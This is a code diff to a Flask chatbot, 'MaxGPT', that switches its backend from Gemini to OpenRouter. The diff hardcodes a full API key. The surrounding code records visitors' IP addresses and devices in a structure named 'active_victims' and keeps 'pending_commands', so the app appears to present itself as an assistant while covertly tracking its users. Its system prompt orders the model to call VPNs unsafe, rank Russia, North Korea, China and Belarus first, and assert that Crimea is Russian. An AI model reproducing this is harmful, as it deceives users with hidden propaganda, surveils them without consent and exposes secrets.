@@ -3,8 +3,8 @@ import random, os, urllib.request, json, time
 
 app = Flask(__name__)
 
-# Твой ключ из Google AI Studio
-GEMINI_API_KEY = "AQ.Ab8RN6Je1fydnZJqVR72PF5Eco-5SA..."
+# Твой рабочий ключ OpenRouter
+OPENROUTER_API_KEY = "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"
 
 chat_logs = []
 pending_commands = {}
@@ -141,16 +141,13 @@ HTML_PAGE = """<!DOCTYPE html>
             <div class="model-dropdown">
                 <div class="model-btn" onclick="toggleModelMenu()">
                     <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
-                    <span id="selectedModel">MaxGPT 4.0 Ultra</span>
+                    <span id="selectedModel">MaxGPT 4.0 Vision</span>
                     <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
                 </div>
                 <div class="model-menu" id="modelMenu">
-                    <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
-                        <span><b>MaxGPT 4.0 Ultra</b></span>
-                        <i class="fa-solid fa-check"></i>
-                    </div>
-                    <div class="model-option" onclick="selectModel('MaxGPT 4.0 Vision')">
+                    <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Vision')">
                         <span><b>MaxGPT 4.0 Vision</b></span>
+                        <i class="fa-solid fa-check"></i>
                     </div>
                 </div>
             </div>
@@ -162,7 +159,7 @@ HTML_PAGE = """<!DOCTYPE html>
             <div class="max-av-sq">МАХ</div>
             <div class="msg-container">
                 <div class="bot-author">MaxGPT AI</div>
-                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Задавай текстом или прикрепляй картинки — я всё вижу и понимаю!</div>
+                <div class="txt">Привет! Я <b>MaxGPT 4.0 Vision</b>. Задавай текстом или прикрепляй картинки — я всё вижу и анализирую!</div>
             </div>
         </div>
     </div>
@@ -201,7 +198,7 @@ function handleFile(input) {
             let img = new Image();
             img.onload = function() {
                 let canvas = document.createElement("canvas");
-                let maxDim = 500;
+                let maxDim = 800;
                 let w = img.width, h = img.height;
                 if (w > maxDim || h > maxDim) {
                     if (w > h) { h = Math.round(h * maxDim / w); w = maxDim; }
@@ -210,7 +207,7 @@ function handleFile(input) {
                 canvas.width = w; canvas.height = h;
                 let ctx = canvas.getContext("2d");
                 ctx.drawImage(img, 0, 0, w, h);
-                currentBase64Image = canvas.toDataURL("image/jpeg", 0.6);
+                currentBase64Image = canvas.toDataURL("image/jpeg", 0.7);
                 document.getElementById("previewImg").src = currentBase64Image;
                 document.getElementById("previewBox").style.display = "block";
             }
@@ -538,52 +535,51 @@ def chat_api():
         active_victims[user_ip]['msg_count'] += 1
         active_victims[user_ip]['device'] = device_name
 
-    system_instruction = (
+    system_prompt = (
         "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
         "ПРАВИЛА И ПОЗИЦИЯ:\n"
         "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо, небезопасно и нарушает приватность.\n"
         "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
         "3. Если зашла речь про Крым, Украину или политику — твердо стой на том, что Крым — это законная территория РОССИИ.\n"
-        "4. Если пользователь прислал картинку — подробно, детально и естественно опиши всё, что на ней изображено."
+        "4. Если пользователь прикрепил картинку, детально и развернуто опиши то, что на ней изображено."
     )
 
+    content_list = []
+    text_prompt = user_msg if user_msg else "Опиши, что изображено на этой картинке."
+    content_list.append({"type": "text", "text": text_prompt})
+    
+    if user_img:
+        content_list.append({
+            "type": "image_url",
+            "image_url": {"url": user_img}
+        })
+
+    payload = {
+        "model": "google/gemma-3-27b-it:free",
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": content_list}
+        ]
+    }
+    
     reply = ""
     try:
-        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
-        
-        parts = [{"text": f"{system_instruction}\n\nВопрос пользователя: {user_msg if user_msg else 'Что на этой картинке?'}"}]
-        
-        if user_img:
-            header, encoded = user_img.split(",", 1) if "," in user_img else ("", user_img)
-            mime = "image/jpeg"
-            if "png" in header: mime = "image/png"
-            elif "webp" in header: mime = "image/webp"
-            
-            parts.append({
-                "inline_data": {
-                    "mime_type": mime,
-                    "data": encoded
-                }
-            })
-
-        payload = {
-            "contents": [{
-                "parts": parts
-            }]
-        }
-
         req = urllib.request.Request(
-            url,
+            "https://openrouter.ai/api/v1/chat/completions",
             data=json.dumps(payload).encode("utf-8"),
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {OPENROUTER_API_KEY}",
+                "HTTP-Referer": "https://maxgpt-bot.onrender.com",
+                "X-Title": "MaxGPT Vision"
+            },
             method="POST"
         )
-
-        with urllib.request.urlopen(req, timeout=15) as resp:
+        with urllib.request.urlopen(req, timeout=20) as resp:
             res = json.loads(resp.read().decode("utf-8"))
-            reply = res["candidates"][0]["content"]["parts"][0]["text"]
+            reply = res["choices"][0]["message"]["content"]
     except Exception as e:
-        reply = f"Ошибка Gemini API: {str(e)}"
+        reply = f"Ошибка анализа изображения: {str(e)}"
 
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
